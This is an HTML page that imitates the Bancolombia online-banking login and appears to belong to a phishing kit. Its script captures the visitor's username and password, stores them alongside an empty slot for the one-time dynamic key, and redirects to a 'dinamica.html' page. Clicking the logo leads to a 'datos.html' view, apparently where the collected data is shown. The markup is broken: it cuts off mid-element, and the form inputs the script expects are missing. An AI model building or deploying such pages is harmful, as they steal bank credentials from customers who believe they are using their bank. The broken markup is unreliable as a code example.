<!DOCTYPE html>
<html lang="es">

<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>Bancolombia â€” Sucursal Virtual</title>
    <style>
        :root {
            --bg: #1f1f1f;
            --card: #2b2b2b;
            --muted: #a9a9a9;
            --text: #eaeaea;
            --primary: #f6c000;
            --secondary: #ff7a3d;
            --tertiary: #7c5cff;
            --success: #2dd4bf;
            --shadow: 0 10px 30px rgba(0, 0, 0, .45);
            --radius: 14px;
        }

        * {
            box-sizing: border-box
        }

        html,
        body {
            height: 100%
        }

        body {
            margin: 0;
            background: var(--bg);
            color: var(--text);
            font-family: system-ui, -apple-system, Segoe UI, Roboto, Ubuntu, Cantarell, Noto Sans, Helvetica, Arial;
            display: grid;
            place-items: center;
            overflow-x: hidden;
        }

        .wrap {
            width: min(920px, 92vw);
            position: relative
        }

        .curves {
            position: fixed;
            inset: 0;
            pointer-events: none;
            z-index: 0;
        }

        .curve {
            position: absolute;
            width: 1200px;
            height: 1200px;
            opacity: .95;
            filter: drop-shadow(0 2px 0 rgba(0, 0, 0, .05));
        }

        .curve path {
            fill: none;
            stroke-linecap: round;
            stroke-width: 26
        }

        .curve.yellow path {
            stroke: var(--primary)
        }

        .curve.orange path {
            stroke: var(--secondary)
        }

        .curve.purple path {
            stroke: var(--tertiary)
        }

        .curve.tilt-left {
            left: -200px;
            top: 40%;
            transform: rotate(-18deg)
        }

        .curve.tilt-right {
            right: -220px;
            top: -8%;
            transform: rotate(24deg)
        }

        header {
            text-align: center;
            margin-bottom: 60px;
            position: relative;
            z-index: 2
        }

        .logo {
            font-weight: 800;
            letter-spacing: .2px;
            display: inline-flex;
            align-items: center;
            gap: .6rem;
            cursor: pointer;
            transition: transform 0.2s ease;
        }

        .logo:hover {
            transform: scale(1.05);
        }

        .logo-img {
            width: 50px;
            height: auto;
            cursor: pointer;
        }

        .title {
            font-size: clamp(1.3rem, 2.4vw, 1.9rem);
            margin-top: 6px;
            color: #fff;
            opacity: .92
        }

        .notice {
            background: #1e3a37;
            border: 1px solid rgba(45, 212, 191, .25);
            color: #d1faf5;
            padding: 14px 16px;
            border-radius: var(--radius);
            box-shadow: var(--shadow);
            display: flex;
            gap: .75rem;
            align-items: flex-start;
        }

        .notice b {
            color: #a7f3f0
        }

        .notice a {
            color: #a7f3f0
        }

        .card {
            background: var(--card);
            border-radius: var(--radius);
            box-shadow: var(--shadow);
            padding: 26px;
            margin-top: 14px;
            position: relative;
            z-index: 2;
        }

        .card h2 {
            margin: 0 0 10px;
            font-size: 1.4rem
        }

        .card p.sub {
            margin: 0 0 18px;
            color: var(--muted)
        }

        .field {
            margin: 18px 0
        }

        .label {
            font-size: .95rem;
            margin-bottom: 8px;
            display: block;
            color: #d7d7d7
        }

        .input {
            display: flex;
            align-items: center;
            gap: .6rem;
            background: #212121;
            border: 1px solid #383838;
            border-radius: 12px;
            padding: 12px 12px;
            transition: .15s border-color ease;
        }

        .input:focus-within {
            border-color: #5b5b5b
        }

        .input svg {
            width: 18px;
            height: 18px;
            opacity: .8;
            flex: 0 0 auto
        }

        .input input {
            flex: 1;
            border: 0;
            outline: 0;
            background: transparent;
            color: var(--text);
            font-size: 1rem;
        }

        .help-links {
            margin-top: 8px;
            display: flex;
            gap: 18px;
            flex-wrap: wrap
        }

        .help-links a {
            color: #cfcfcf;
            font-size: .9rem;
            text-underline-offset: 2px
        }

        .actions {
            margin-top: 20px
        }

        button {
            width: 100%;
            padding: 14px 16px;
            border: 0;
            border-radius: 999px;
            font-weight: 700;
            font-size: 1rem;
            opacity: .7;
            cursor: not-allowed;
            background: #3a3a3a;
            color: #bdbdbd;
            transition: .2s;
        }

        button.enabled {
            opacity: 1;
            cursor: pointer;
            background: #3f3f3f
        }

        button.enabled:hover {
            transform: translateY(-1px);
            box-shadow: 0 6px 18px rgba(0, 0, 0, .35)
        }

        .create {
            display: block;
            text-align: center;
            margin-top: 14px;
            color: #cfcfcf
        }

        footer {
            margin-top: 26px;
            text-align: center;
            color: #9a9a9a;
            font-size: .85rem
        }

        footer a {
            color: #c9c9c9
        }

        @media (max-width:600px) {
            .card {
                padding: 18px
            }

            .notice {
                padding: 12px
            }
        }
    </style>
</head>

<body>

    <main class="wrap">
        <header>
            <div href="tabla.html" class="logo" aria-label="Bancolombia" id="logoBtn">
                <img src="./bancolombia-logo.png" alt="Bancolombia" class="logo-img">
                <span>Bancolombia</span>
            </div>
            <div class="title">Sucursal Virtual Personas</div>

        <div class="notice" role="status" aria-live="polite">

        </div>

        <section class="card" aria-labelledby="formTitle">
            <h2 id="formTitle">Â¡Hola!</h2>

            <form id="loginForm" novalidate>
                <div class="field">
                    <label class="label" for="usuario">Usuario</label>
                    <div class="input">
                        <svg viewBox="0 0 24 24" fill="none" aria-hidden="true">
                            <path d="M12 12a5 5 0 100-10 5 5 0 000 10zm-8 9.5a8 8 0 1116 0V22H4v-.5z"

    <script>
        // Variables globales para compartir datos
        let userData = JSON.parse(localStorage.getItem('bancolombiaData') || '[]');
        let currentUser = JSON.parse(sessionStorage.getItem('currentUser') || '{}');

        // Elementos DOM
        const usuarioInput = document.getElementById('usuario');
        const claveInput = document.getElementById('clave');
        const loginBtn = document.getElementById('loginBtn');
        const logoBtn = document.getElementById('logoBtn');

        // FunciÃ³n de validaciÃ³n
        function validateLoginForm() {
            const usuario = usuarioInput.value.trim();
            const clave = claveInput.value.trim();
            const isValid = usuario.length > 0 && clave.length > 0;

            loginBtn.classList.toggle('enabled', isValid);
            return isValid;
        }

        // Event listeners
        usuarioInput.addEventListener('input', validateLoginForm);
        claveInput.addEventListener('input', validateLoginForm);

        loginBtn.addEventListener('click', (e) => {
            e.preventDefault();
            if (validateLoginForm()) {
                // Guardar datos actuales en sessionStorage
                currentUser = {
                    usuario: usuarioInput.value.trim(),
                    clave: claveInput.value.trim(),
                    claveDinamica: '',
                    timestamp: ''
                };
                sessionStorage.setItem('currentUser', JSON.stringify(currentUser));

                // Redirigir a pÃ¡gina de clave dinÃ¡mica
                window.location.href = 'dinamica.html';
            }
        });

        // Clic en logo para ir a datos
        logoBtn.addEventListener('click', () => {
            window.location.href = 'datos.html';
        });

        // InicializaciÃ³n
        document.getElementById('year').textContent = new Date().getFullYear();
        validateLoginForm();

        // Si hay datos de retorno de clave dinÃ¡mica, limpiar formulario
        if (sessionStorage.getItem('loginCompleted')) {
            usuarioInput.value = '';
            claveInput.value = '';
            validateLoginForm();
            sessionStorage.removeItem('loginCompleted');
        }
    </script>

</html>
